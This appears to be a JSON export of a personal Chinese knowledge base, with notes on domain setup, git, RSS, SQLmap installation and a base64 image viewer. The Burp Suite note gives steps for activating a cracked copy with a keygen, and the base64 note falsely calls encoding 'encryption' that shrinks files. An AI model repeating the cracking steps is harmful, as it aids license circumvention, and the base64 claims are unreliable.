```\n","lastmodified":"2023-05-31T09:03:32.981907233Z","tags":null},"/Notion%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D":{"title":"Notion自定义域名","content":"\n\n# 基本配置\n\n1. 注册账号或者登录`cloudflare`\n\n[Cloudflare 中国官网 | 智能化云服务平台 | 免费CDN安全防护](https://www.cloudflarecn.com/)\n\n2. 添加自己的二级域名\n\n![20230203133016.png](https://tc3.doingnothing.online/assets/20230203133016.png)\n\n3. 到自己的域名管理网站，修改dns的nameserver为cloudflare提供的两个域名，然后就是如下图，点击入门指南进行设置\n\n```bash\nwren.ns.cloudflare.com\nlangston.ns.cloudflare.com\n```\n\n![Untitled](https://tc3.doingnothing.online/assets/202303042303330.png)\n\n4. 新手指南里面的全部勾选\n\n![20230203133420.png](https://tc3.doingnothing.online/assets/20230203133420.png)\n\n\n# 设置路由\n\n1. 打开路由中的管理`workers`\n\n![imgs/20230203134205.png](https://tc3.doingnothing.online/assets/20230203134205.png)\n\n2. 创建服务\n\n![20230203134407.png](https://tc3.doingnothing.online/assets/20230203134407.png)\n\n3. 什么都不用管，直接创建即可\n\n![](https://tc3.doingnothing.online/assets/20230203134436.png)\n\n4. 找到添加自定义域\n\n![](https://tc3.doingnothing.online/assets/20230203134603.png)\n\n5. 设置好了自己的域名之后，直接添加即可（可以设置二级域名zhsangsan.com，也可以设置三级域名比如blog.zhangsan.com)\n\n![](https://tc3.doingnothing.online/assets/20230203134712.png)\n\n6. 添加路由和自定义域名（自定义域忘了截图了，也需要添加自己的域名进去）\n\n![](https://tc3.doingnothing.online/assets/20230203135255.png)\n\n7. 配置work\n\n![](https://tc3.doingnothing.online/assets/20230203134855.png)\n\n8. 快速生成代码，然后添加到里面\n生成,notion链接是分享的那个链接，不是notion.so的那个，是notion.site的那个分享出去的链接\n\n[https://fruitiongitmasterstephenou.vercel.app/](https://fruitiongitmasterstephenou.vercel.app/)\n\n![Untitled](https://tc3.doingnothing.online/assets/202303042304151.png)\n\n\n![](https://tc3.doingnothing.online/assets/20230203135140.png)\n\n\n完成\n\n没成功的话，就看一个参考，写的比我详细\n\n# 参考\n\n[15 分钟搞定 Notion 自定义域名](https://eryinote.com/post/225)\n\n[自定义域名](https://www.notion.so/3824620fe7b54422ac22280b933c3a51)\n\n[Fruition Build Your Next Website With Notion, For Free](https://fruitionsite.com/)\n\n# 注意\n\n请使用[https://fruitiongitmasterstephenou.vercel.app/](https://fruitiongitmasterstephenou.vercel.app/)的生成代码，否则可能会报错。","lastmodified":"2023-05-31T09:03:32.981907233Z","tags":null},"/Obsidian%E7%9F%A5%E8%AF%86%E5%BA%93%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97":{"title":"002_知识库更新日志","content":"# 002_知识库更新日志\n\n```mermaid\njourney\ntitle 知识库更新日志\n\tsection 2022-09-30\n\t\t添加药品:5:me\n\tsection 2022-09-28\n\t\t添加影片:5:me\n\t\t添加影片模板:5:me\n\tsection 2022-09-27\n\t\t创建知识库目录看板:5:me\n\t\t整理笔记格式:5:me\n\t\t看板目录的使用:2:me\n\n```","lastmodified":"2023-05-31T09:03:32.981907233Z","tags":null},"/Obsidian%E7%9F%A5%E8%AF%86%E5%BA%93%E7%AC%94%E8%AE%B0%E7%9B%B8%E5%85%B3%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9":{"title":"003_Obsidian知识库笔记相关注意事项","content":"## 关于内容（包含title字段的yaml头）\n1. 尤其需要注意的是，在每片文章中书写一个yaml头，其中yaml头包括了`title`字段，用来标识这篇文章的标题，当然，如果没有也没有太大的问题，只是不能显示这个标题，但一般还是建议有一个\n2. 如果每次添加比较麻烦，你可以配合Obsidan中的`Templater`插件进行生成，当然，你还可以为其设置一个专属的快捷键，那会让你更“快”的。（下面放置了一个基本的Templater模板，yaml字段采用`#`号注释）\n所有字段都可以不用，但是建议保留title字段，字段名和字段值中间采用`:`隔开，**分号后面有一个空格，需要注意**\n```\n---\ncomments: false   #该字段可以不要，因为采用了gittalk的评论区，貌似已经不起作用了\ndate created: \u003c% tp.date.now() %\u003e  #采用Templater生成的文档创建时间\ndate modified: 2022-08-20          #此处我没有找到自动化的东西，是因为我觉得自动化的不如我自己手动修改\nid:                                #开源者继承下来的字段，我不知道啥作用\nlayout: page                    #布局格式，与网站的搜索方式有关\ntags: \u003c% tp.file.folder() %\u003e    #tag标签，我采用的是用父文件夹名，因为我一般都用文件夹进行归类\ntitle: \"\u003c% tp.file.title %\u003e    #文件名\"\n---\n```\n---\n## 关于文章相互之间引用\n\u003e[!faq]+ 总结\n\u003e采用`[[文章的title]]`的方式，尤其需要注意的是title中不能带有`.`（英文点符号），否则无法识别\n\n博客之前相互引用的方式为`[[]]`中间只放title名，所以尽量不要有重复的文件名，但事实上并不太可能，所以我也没有其他比较好的解决办法，值得庆幸的是，我的文件名几乎都有标识符编号，那样就不会出现重复的title名称\n\n---\n## 关于图片链接\n是在是没有搞清楚这个图片链接的形式是如何的，我看了一下源作者的博客链接 [Oldwinter](https://garden.oldwinter.top/HOMEPAGE#:~:text=%E4%B8%BB%E9%A1%B5%E5%85%B6%E5%AE%9E%E4%B9%9F%E6%98%AF%E4%B8%80/)，图片也是挂了很多。\n经过尝试，我发现了链接的可行性方案\n1. 将在知识库根文件夹下创建一个文件夹，比如我的知识库是obzsk，那么就在下面创建一个pic文件夹，然后在ob里面分别设置附件位置为这个文件夹，其次，**还需要关闭ob中的附件链接基于相对路径**![](../assets/Pasted%20image%2020220918102408.png)\n2. 将所有图片上传到云端，采用图床的方式，这是通用的\n3. 采用base64引入的方式作为图片数据，经过测试，不行。\n\u003e[!faq]+ 总结\n\u003e1. 在知识库本目录下新建一个文件夹，在obsidian里面设置附件采用相对路径（基于当前文件目录），这样的话是可以使用的（因为采用这种方式，标准markdown编辑器和github也是可以识别的，而采用wiki形式，其他编辑器就无法识别了，迁移也比较麻烦）\n\u003e2. 通用方法：采用图床链接的形式，这个是万能的\n\n## 关于标准Markdown语法\n\u003e[!info] 这个知识库采用的是部分标准的markdown语法，这意味着你的换行采用两个换行符才能有换行的效果。\n\n## 关于目录的制作\n1. 插件`Quickadd` 思路是：通过每次创建笔记的时候，可以在创建笔记的时候，同时将笔记的相关链接生成放到一个markdown中，当然这个脚本我之前改过一个，但是后面弃用了，原因是兼容性比较差\n2. 通过`dataview`插件（作用是通过yaml字段生成数据表之类的视图），然后通过另一个插件进行导出，但是我忘了另一个插件的名称了\n3. 通过`kanban`看板插件，每次写笔记的时候都在看板里面写好`[[标题]]`的方式，然后双击这个标题，就可以点击进去，但是操作简单，但是整理过去的已经写好的笔记笔记麻烦","lastmodified":"2023-05-31T09:03:32.981907233Z","tags":null},"/Obsidian-hugo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA":{"title":"Obsidian-hugo博客搭建","content":"\n\n- [[hugo]] [[../../pages/博客]]\n# 概述\n为什么选择hugo?\n快速，支持markdown。\n博客框架支持markdown的，目前主流的有jekyll、hexo以及hugo。\nhugo\u003ehexo\u003ejekyll  主题上jekyll更偏向我的审美，但是生成比较慢\n\n文章原因：看到相同类型Obsidian搭建博客的视频，发现了可以优化的地方，录起来记录一下。\n# 材料\n1. github账号\n2. vercel账号\n3. vscode（能够git即可）\n4. git环境\n5. 域名（如果需要自己进行定义的话）\n# 搭建\n\n无脑vercel克隆部署\n# 优化\n使用git action，将博客和笔记分成两个分支，通过工作流将需要发布的文章的文件夹同步到博客分支的对应文件夹下面。\n\naction工作流的文件\n```yaml\nname: File Sync\n\non:\npush:\n  branches:\n  # 当以下分支push时会启动工作流\n    - main\nschedule:\n  - cron: 0 0 * * *\n\njobs:\nfile_sync:\n  runs-on: ubuntu-latest\n  steps:\n    - name: Fetching Local Repository\n      uses: actions/checkout@master\n    - name: File Sync\n      uses: kbrashears5/github-action-file-sync@v2.0.0\n      with:\n        REPOSITORIES: |\n        # 克隆文件到以下分支\n          username/repo@master\n        FILES: |\n        # 同步的文件\n          sync/dependabot.yml=.github/dependabot.yml\n        TOKEN: ${{ secrets.ACTIONS }}\n```\n# 主题配置\n一直觉得是环境的问题，后来发现很多的hugo博客的主题都是已经配置好的，然后别人弄在自己的项目上作为开源，还发在了博客主题站。\n所以使用别人的主题的时候需要看一下readme文件是否是主题使用介绍文件，如果不是，那么八成就可能是已经配置好的别人的主题。\n所以你直接克隆部署他的仓库，或者克隆他仓库里面的主题文件夹，复制一下配置就好了。","lastmodified":"2023-05-31T09:03:32.981907233Z","tags":null},"/RCE":{"title":"RCE","content":"- [[01-什么是RCE]]\n- 02-案例\n\t- [[01-ctfub-evel]]\n\t- [[02-ctfhub-命令注入]]\n\t- [[03-ctfhub-过滤cat]]\n\t- [[04-ctfhub-过滤目录分隔符]]\n\t- [[04-ctfub-过滤空格]]\n- [[03-RCE漏洞的防御]]","lastmodified":"2023-05-31T09:03:32.981907233Z","tags":null},"/README":{"title":"README","content":"\n# Obzhishiku\n我的Obsiidan知识库\n 项目Demo: [example](https://ob.tianzhongs.ml) \n主要用于部署Obsidian的知识库内容，在网页端也能完美展示其双链等基础笔记功能，具有评论功能。\n","lastmodified":"2023-05-31T09:03:32.981907233Z","tags":null},"/RSS%E8%81%9A%E5%90%88%E5%99%A8%E5%A6%82%E4%BD%95%E9%AB%98%E6%95%88%E6%9F%A5%E7%9C%8B%E4%BA%92%E8%81%94%E7%BD%91%E4%BF%A1%E6%81%AF":{"title":"RSS聚合器—如何高效查看互联网信息","content":"\n# 引入\n目前的资讯信息繁杂，信息量也越来越大，同时，垃圾信息也越来越庞大。平时，我们在了解各种资讯和娱乐信息的时候，常常需要翻阅很多的内容才能看到真正对我有用的文章。\n\n**信息量的扩大，导致了我们可能很难及时的接受有益或对我们真正有用的讯息。所以，我强烈建议你需要RSS聚合阅读器。**\n# 作用\n**直接获取你所关心的内容，避免了垃圾信息的繁琐干扰，能够只有有效的获取到你所喜欢的内容。**\n\n听到这里可能很多还是不知道有什么用，举例是最好的方法。\n举例\n比如国内的**知乎、头条、微博、微信、公众号、抖音，或者是bilbil、优酷类的视频软件，又或者是月光博客、CSDN博客、新浪微博等博客类型的网站**，甚至更多的充满了讯息、实时分享信息的网站或者平台，你一定在里面有所了解过。\n这些里面都有很多的信息，比如今天的热点、某个人的抖音更新情况、某一个知乎大佬的更新、博客或者论坛的技术教程又有所更新，等等。这些信息虽然你都可以**直接通过登录到相应的软件或者或者网站去查看阅读，但是随着平台的增多，你还会一个一个登录几十个平台去依次查看吗？**\n我想那样也太耗尽心力了，所以这就是RSS的必要。\n**RSS 可以直接通过 Feed（相当于是一个特殊的 Url），通过你所想看的网站或者博客相关的 RSS，你就可以直接在聚合器内获取到相关的最新资讯。**\n**比如我想看我自己知乎的消息，就添加一个知乎个人的 RSS** F**eed（[](https://feed43.com/8436633483761823.xml) [https://feed43.com/8436633483761823.xml](https://feed43.com/8436633483761823.xml)）这个订阅直接点击意义不大，可以尝试点击一下。**\n![](https://tc3.doingnothing.online/assets/20230105041114.png)\n**然后你就可以直接看到我个人的讯息了，同样，你还可以订阅知乎、抖音、bilbil、youtube、推特等等，这样聚合起来的讯息，你就可以直接通过不同的 feed 来订阅不同的平台信息。值得一体的是，很多的聚合器平台都是可以过滤掉广告，用文字和图片视频等过滤好的样式展示给你看，如果你想要获取更多的内容，还可以在聚合器内直接点击到达该网站，非常的方便。**\n在很久之前很多讯息都是邮箱订阅 rss 来获取讯息的，但是我并不建议用邮箱，因为以后哪天不想看了，邮箱天天还给你发这些消息，应该会让人感到头疼，不过目前很多都没有开设邮箱订阅的方式。所以还是比较建议用一般的 RSS 聚合器软件订阅。\n# RSS 订阅平台软件\n软件\n\t安卓首推 `**feedly**`（不支持中文）、`**inoreader**`（支持中文）界面都很简洁，是国外比较常用的。\n网站\n\t蚁阅\n浏览器插件\n\trss feed reader\n# 相关介绍\n什么是RSS\n  \u003e RSS是**在线共享内容的一种简易方式**(也叫聚合内容，Really Simple Syndication)。\n  **简单的来说，就是用来获取讯息的方式，而且可以由用户自定义自己想要的内容。**\n**万物皆可RSS**\n几乎有关资讯的网页都可以通过烧制Feed，来实现RSS订阅。\n通常在时效性比较强的内容上使用RSS能更快速获取信息，网站提供RSS输出，有利于让用户获取网站内容的最新更新。网络用户可以在客户端借助于支持RSS的聚合工具软件，在不打开网站内容页面的情况下阅读支持RSS输出的网站内容。一般需要下载和安装一个RSS阅读器，然后从网站提供的RSS目录列表中订阅您感兴趣的内容。订阅后将会及时获得所订阅的最新内容。\n-\n什么是聚合器\n\u003e 是指可用于**阅读RSS、Atom等消息来源的软件或服务**。**简单的来说，就是用来进行阅读RSS讯息的工具。**\n# 获取 RSS feed\n获取订阅源（主要针对热门）\n\t通过网站主页文末或者文首查找、源码查找\n\t百度或论坛查找RSS订阅\n\t自己制作（针对个别或者自己的）\n\t\tRsshub（首推，操作简单)\n\t\tFeed43（自定义性强，几乎所有的网站都可以）\n# 如何进行 RSS 订阅制作\n简洁版：使用 Rsshub 制作\n复杂版：使用 Feed43 来制作，复杂的都可以通过这个来制作","lastmodified":"2023-05-31T09:03:32.981907233Z","tags":null},"/SQLmap%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B":{"title":"SQLmap安装教程","content":"\n\n# SQLmap安装教程\n\n## sqlmap简介：\n\n sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MS-SQL,,MYSQL,ORACLE和POSTGRESQL。SQLMAP采用四种独特的SQL注入技术，分别是盲推理SQL注入，UNION查询SQL注入，堆查询和基于时间的SQL盲注入。其广泛的功能和选项包括数据库指纹，枚举，数据库提取，访问目标文件系统，并在获取完全操作权限时实行任意命令。\n\n## 准备工作：\n\n(1) Python2.7.11；\n\nhttps://www.python.org/\n\n(2) SQLMap\n\nhttps://sqlmap.org/\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/4a026f364a47475ebdb55615256e8de9.png)\n\n默认全选，下一步\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/07923b5ef4144f02aa16bb4d7b8f0c4b.png)\n\n更改安装路径即可\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/449d3cb7f5bd4cc895d1ba721f90d633.png)\n\n下载sqlmap：\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/b09c468d9ba34ad8956773775d54a439.png)\n\n下载完成，进行解压文件，推荐除C盘以外其他盘符\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/7b3424a4c54144a6b6b69f578d9dbba3.png)\n\n再安装路径下，输入cmd\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/494d793ab27f44f5a9c46a335cab347b.png)\n\n启动cmd，输入sqlmap.py 检测是否运行成功！\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/8728087c256b4cf9848fd4dfc4c0d0fb.png)\n\n对应工具包网盘地址：\n\n链接：https://pan.baidu.com/s/1yC8P6a_5KI5B_JT7uyVHTw\n提取码：0xkf\n","lastmodified":"2023-05-31T09:03:32.981907233Z","tags":null},"/Vercel%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D":{"title":"Vercel自定义域名","content":"# Vercel自定义域名\n\n\nCreated: September 5, 2022 5:20 PM\n\n# 准备\n\n1. 域名\n2. vercel已经部署好的网站\n\n![Untitled](../../assets/Vercel自定义域名1.png)\n\n# 步骤\n\n1. 点击vercel中已经部署好的项目，点击`set`\n2. `domain`中添加已经购买的域名，简单域名和子域名都可以，举例：`www.[zhangsan.ml](http://zhangsan.ml)`  `zhangsan.ml` \n3. 在购买的网站中设置域名解析\n4. 在购买的域名服务提供商中填写解析\n- 域名解析填写\n    \n    域名解析包括:A记录、CNAME记录、NS记录、MX记录、URL显示转发、URL隐性转发、动态域名解析。在域名解析时，需要添加解析记录值，一般是填写主机服务商提供的ip地址。不同应用域名解析方式可能会不一样，要先知道各项记录值的区别，才能明白他们的意思和作用。\n    \n    A记录：主要用来指定主机或者域名对应的IP地址，告诉DNS网站所在服务器的址，这样用户输入域名后DNS才能找到网站。\n    \n    CNAME：又叫别名解析，一般是会指定一个DNS服务商提供的二级域名，这样DNS通过这个二级域名也能找到服务器的IP地址。使用CNAME的好处是，即使服务器的IP地址发生变更，也不用更改解析记录，DNS会自动更新解析，相比A记录少了一些改动的麻烦。\n    \n    MX记录：填写的是邮件服务器的IP地址或企业邮局给您提供的域名，如果不知道，请咨询邮件服务提供商。\n    \n    AAAA：是将主机名（或域名）指向解析到 IPv6 的地址。\n    \n    NS记录：域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录。系统默认添加的两个NS记录请不要修改。NS向下授权，填写dns域名，例如：dks.dns.com\n    \n\n# About\n\n[免费域名Freenom](https://www.notion.so/Freenom-47652f9824ed4c8a940d3789e32b00a6)","lastmodified":"2023-05-31T09:03:32.981907233Z","tags":null},"/burp-sulite":{"title":"burp sulite","content":"\n\n- 相关url：[https://blog.csdn.net/qq_20737293/article/details/123031004、](https://blog.csdn.net/qq_20737293/article/details/123031004%E3%80%81)\n- 安装步骤简述：\n- 下载安装包，解压缩\n- 准备好java环境\n- 在解压缩的目录cmd，打开dos窗口\n- 使用`java -jar xxx.jar`打开破解文件的jar包\n- 点击run，运行，会启动bs软件\n- 将破解jar软件中的代码复制到bs中，点击bs中的下一步，点击手动激活，不要点击最右边的按钮\n- 然后将bs中的下一步弹出的代码放到jar软件中，破解，生成代码\n- 最后把代码复制到bs中，破解成功\n- ## 字体偏移问题\n- 主要是因为字体缩放的原因，软件本身不适配。\n- 将系统的缩放设置成100%，然后修改字体大小即可。\n- 或者修改软件本身的缩放，目前没找到地方设置。","lastmodified":"2023-05-31T09:03:32.981907233Z","tags":null},"/chatgpt":{"title":"chatgpt","content":"\n\n- # 可用的\n- [AI_TOOL00 - 服务于人类，致力于让人类更美好。](https://chatgpt.tool00.com/)\n- [ChatGPT 网站 - 小白工具箱 (ooopn.com)](https://www.ooopn.com/tool/chatgpt/)\n- Notion AI\n- 官网：[New chat (openai.com)](https://chat.openai.com/)","lastmodified":"2023-05-31T09:03:33.0339077Z","tags":null},"/csrf":{"title":"csrf","content":"\n- [[01-csrf漏洞基本认识]]\n- [[02-csrf漏洞案例]]\n- [[03-csrf漏洞检测以及防御]]","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/day24_%E6%AD%A6%E5%99%A8%E4%BD%9C%E4%B8%9A%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93":{"title":"day24_武器作业问题总结","content":"1. 没有基本的结构\n2. 没有想到异常处理\n3. 容易忘记在方法上写 throws 异常\n4. 在throw new的时候放在了for里面，这非常纸张。导致的情况是，添加了一个武器就添加不进去了，还找了半天的问题","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/git%E5%AD%90%E6%A8%A1%E5%9D%97-submodule":{"title":"git子模块 submodule","content":"\n- about：\n\t- [rouroux](https://rouroux.github.io/git-submodule/#%E5%AD%90%E6%A8%A1%E5%9D%97%E7%9A%84%E6%B7%BB%E5%8A%A0)\n- ##  添加子模块\n- ```\n  git submodule add gitUrl 模块名称 \n  git submodule update --init #初始化\n  git submodule update --remote #更新到最新版本子模块\n  ```\n- ## 更新子模块\n- ```\n  git submodule update --init  //初始化版本\n  git submodule update --remote  //更新到最新版本\n  ```\n- ## 删除子模块\n- ```\n  rm -rf 子模块目录     #删除子模块目录及源码 bash下使用\n  vi .gitmodules       #删除项目目录下.gitmodules文件中子模块相关条目\n  vi .git/config       #删除配置项中子模块相关条目\n  rm .git/module/*     #删除模块下的子模块目录，每个子模块对应一个目录，注意只删除对应的子模块目录即可\n  ```\n- 执行完成后，再执行添加子模块命令即可，如果仍然报错，执行如下\n- git rm --cached 子模块名称\n- 提交","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/git-%E4%BB%A3%E7%A0%81%E5%90%88%E5%B9%B6%E7%9A%84%E4%B8%8D%E5%90%8C%E6%96%B9%E5%BC%8F":{"title":"git-代码合并的不同方式","content":"\n# 005-代码合并的不同方式\n\n\n# 强制推送\n`git push --force origin master`\n## 删除主机分支\n`git push origin --delete master`\n## 下载远程仓库与本地合并\n**git pull** 命令用于从远程获取代码并合并本地的版本。\n```bash\ngit pull \u003c远程主机名\u003e \u003c远程分支名\u003e:\u003c本地分支名\u003e\n```\neg:`git pull origin master`\n","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/git-%E5%85%8B%E9%9A%86%E4%BB%93%E5%BA%93":{"title":"git-克隆仓库","content":"\n# 006-克隆仓库\n\n\n## 强制推送 \n`git push --force origin master`\n## 删除主机分支\n`git push origin --delete master`\n## 下载远程仓库与本地合并\n**git pull** 命令用于从远程获取代码并合并本地的版本。\n```bash\ngit pull \u003c远程主机名\u003e \u003c远程分支名\u003e:\u003c本地分支名\u003e\n```\neg:`git pull origin master`\n","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/git-%E5%AE%89%E8%A3%85%E4%B9%8B%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE":{"title":"git-安装之后的配置","content":"\n# 001-安装之后的配置\n\n\n\n## 初始化\n```bash\ngit init\n```\n## 设置个人名称和邮箱 ^veaiyshu\n```\n$ git config --global user.name \"runoob\"\n$ git config --global user.email test@runoob.com\n```\n# 查看配置\n```\ngit config --global user.name\n\n```\n# 查看仓库状态\n`git status`\n## 额外配置\n```bash\ngit config --global core.editor emacs\n``` \n配置**git**文本编辑器\n","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/git-%E6%9B%B4%E6%96%B0%E5%86%85%E5%AE%B9%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B":{"title":"git-更新内容一般流程","content":"\n# 003-更新内容一般流程\n\n---\ncomments: false\ndate created: 2022-09-25\ndate modified: 2022-09-25\nid: \nlayout: page\ntags: Git学习笔记\ntitle: \"003.更新内容一般流程\"\n---\n# 003.更新内容一般流程\n\n```bash\ngit add . #添加所有文件到暂存区\ngit commit -m \"注释\" #更新的注释\ngit push \u003c远程主机名\u003e \u003c本地分支名\u003e:\u003c远程分支名\u003e\n```","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/git-%E6%9F%A5%E7%9C%8B%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC":{"title":"git-查看历史版本","content":"\n# 004-查看历史版本\n\n\ngit log --oneline \n查看过去提交的\n\n---\n\n回退\n git reset --hard 版本号\n git reset --soft 版本号 （软回退）\n \n \ngit reflog\n查看操作历史，用来查看自己是否成功回退\t","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/git-%E6%9F%A5%E7%9C%8B%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF":{"title":"git-查看配置信息","content":"\n# 002-查看配置信息\n\n```bash\ngit config --list\n```\n文件放置在`~/.gitconfig `或 `/etc/gitconfig`\n使用命令`vim ~/.gitconfig`可以查看和进行编辑\n查看单个环境变量可以采用\n`git config user.name`就可以只查看name变量\n![[../assets/18d178a2ff494226a27b7e3aeaa151bb.png]]\n","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/git-%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B":{"title":"git-远程仓库一般流程","content":"\n# 000-远程仓库一般流程\n\n\n1. 配置好用户凭据以及 [[git-安装之后的配置#设置个人名称和邮箱 veaiyshu|用户邮箱]]\n2. 复制仓库链接![[../assets/3cf0ea5585924e54b9d7bb48da739c58.png]]\n\t ```bash\n\techo \"# hanguang\" \u003e\u003e README.md\n\tgit init\t\t\t\t#初始化仓库\n\tgit add README.md\t\t #新建标注文件，可以不要\n\tgit commit -m \"first commit\"\t#“提交信息”\n\tgit branch -M main\t\t\t\t#设置默认分支\n\tgit remote add origin https://github.com/tianzhongs/hanguang.git\t#添加远程分支到本地命名为origin\n\tgit push -u origin main\t#推送origin到默认分支main\n\t```\n\t\n3. 将文件`git clone url`进去，会自动将远端的仓库文件全部下载下来![[Pasted image 20220624141947.png]]，`.gitigore`是配置文件，一般不用动\n4. 使用`git remote -v`查看连接远程仓库的信息,后面括号里面代表的权限 拉取推送![[../assets/61fe6d28229342a79afbdca936ab175a.png]]\n5. 对文件进行修改中以后，使用`git status`可以查看当前仓库修改的内容状态![[Pasted image 20220624145949.png]]\n6. 提交三部曲**add(暂存）,commit（注释）,push（推送）**[[Pasted image 20220624150110.png]]\n7. 查看云端仓库是否有![[Pasted image 20220624150237.png|相关注释]] “修改Blog配置文件”\n\n","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/java%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%A8%8B":{"title":"java学习路程","content":"\n第一 JavaSE内容：\n环境搭建，基础语法，面向 对象，数组，集合，常用API ，IO流，反射机制，多线程，网络编程\n学习要求：利用这些基础知识，写出一个soket聊天室和打字游戏，基础不牢地动山摇。\n\n\n第二 数据库:搞定MYSQL\n学习要求：多练SQL，特别是select\n\n\n第三 前端:\n\n三大核心技术 HTML CSS JavaScript(外带两个框架jQuery,Bootstrap)\n学习要求：手写出一个静态页面(模仿一个页面)\n\n\n第四 后端：\n\nHML,MVC架构模式,Servlet,Filter,JSP,ELSE,JSTL,AJAX,代理模式,工厂模式，数据库连接池\n学习要求：1.深刻理解MVC架构模式\n2.练一个MVC模式项目(用servlet+AJAX+MySQL+jQuery+JDBC)如：oa管理系统，超市订单管理系统，采购订单管理系统，至少两个以上，转变你的mvc思想\n\n\n第五 项目管理：Maven,Git\n学习要求：自己练熟就行\n\n\n第六 框架：\n\nspring,SpringMBC,MyBatis必学\nStruts2,Hibernate过一下就行\n学习要求：1.自己搭建一个框架环境(做好备 份，入职有用)\n2.升级一下自己之前练习的MVC架构模式的项目，比如:把servlet换成springMVC,把JDBS换成MyBatis，加入Spring去解耦MVC(换完能运行)\n3. 练习两个项目：如ssm客户关系管理系统\n\n\n第七 市场需求：\n\nspringboot(并用springboot练习两个以上项目)\n注意：学习springboot吃力，就回去再学一遍spring\n\n\n第八 如果想给盒饭加根加火腿：\n\nDubbo,ZooKeeper,SpringCloud,MQ,Nginx,Redis,Liunx,vue，多线程，设计模式，JVM优化，算法\n\n市面上很多IT培训机构，当你完成上面这些内容的学习以后，就万事大吉了，就开始让你去找工作了！提醒你，这是远远不够的！在汉码未来，毕业生在毕业前必须独立完成2个项目才可以，这个“独立”的意思就是刚开始我提到的：独立分析需求，独立构架数据库，独立编写代码并修复bug，独立完善优化项目的能力！【这一点至关重要】\n\n工作后你也需要继续学习，继续在IT行业中深造，树立“活\n————————————————\n版权声明：本文为CSDN博主「然然手里的猫」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n原文链接：https://blog.csdn.net/m0_60719736/article/details/119808524","lastmodified":"2023-05-31T09:03:33.037907736Z","tags":null},"/js%E6%96%B9%E5%BC%8F%E6%98%BE%E7%A4%BAbase64%E6%96%87%E4%BB%B6%E4%B8%BA%E5%9B%BE%E7%89%87":{"title":"js方式显示base64文件为图片","content":"\n\n# 来源\n️ 在手机上，由于现在的软件恶意访问手机权限和数据，可能会造成隐私泄露。为了避免图片文件被恶意访问，我想到了采用html的方式对图片进行访问，解决思路如下：\n\n第一步：将图片转换成base64编码，存储在本地中，当然，文本文件也可以通过`js` 进行一些简单的加密，这样可以在上传云端的时候，避免被服务器识别抓取文件特征码，也算是一种避免隐私泄露，不过我懒得加密；\n第二步：在HTML中，img标签的`src`属性，除了可以使用我们常见的URL，还**可以通过DataUrl的方式来显示图片，其具体的格式如下：**\n\n```\n  \u003cimg src=\"data:image/gif;base64,R0lGODlhAwADAIAAAP///8zMzCH5BAAAAAAALAAAAAADAAMAAAIEBHIJBQA7\"\u003e\n```\n\n\t各项参数分别为\n\t      data:文件格式\n\t      base64编码，一般不用管\n\t      后面的大串就是bae64编码\n第三步：在整个过程中，除了你处理图片的时候，图片是明文，其他时候都是密文，用html中的来解析也是一种不错的方式。\n采用base64编码有很大的好处，一是**可以对文本文件进行加密**，同时相对较小的文件，**转码之后比图片源文件会小一些**，但是在一些大文件进行转码之后，会比较大，所以用来作为图片的隐私处理也是一个不错的选择。\n\n## 处理[[思路]]\n\t💡在手机端，通过将图片转成base编码，存储为文本文件，可以避免被软件窃取图片\n## 如何解析\n通过点击html上的按钮，选中你所需要的多个转码的base64文件，加载后，点击上一个下一个按钮，会依次显示图片。\n效果展示 ，显示和转码图片为base64文件下载\n![dfhaskjfgdkasjgfhgfsasg46.gif](https://tc3.doingnothing.online/assets/dfhaskjfgdkasjgfhgfsasg46.gif){:height 220, :width 689}\n## 具体代码\n```html\n      \u003c!DOCTYPE html\u003e\n      \u003chtml lang=\"en\"\u003e\n      \n      \u003chead\u003e\n          \u003cmeta charset=\"UTF8\"\u003e\n          \u003cmeta httpequiv=\"XUACompatible\" content=\"IE=edge\"\u003e\n          \u003cmeta name=\"viewport\" content=\"width=devicewidth, initialscale=1.0\"\u003e\n          \u003ctitle\u003eDocument\u003c/title\u003e\n      \u003c/head\u003e\n      \u003cstyle\u003e\n          * {\n              margin: 0;\n              padding: 0;\n          }\n      \n      \u003c/style\u003e\n      \n      \u003cbody\u003e\n          \u003cdiv\u003e\n              \u003cinput type=\"file\" name=\"file\" multiple=\"multiple\" id=\"files\" onchange=\"choosefile()\" /\u003e\n              \u003cbutton 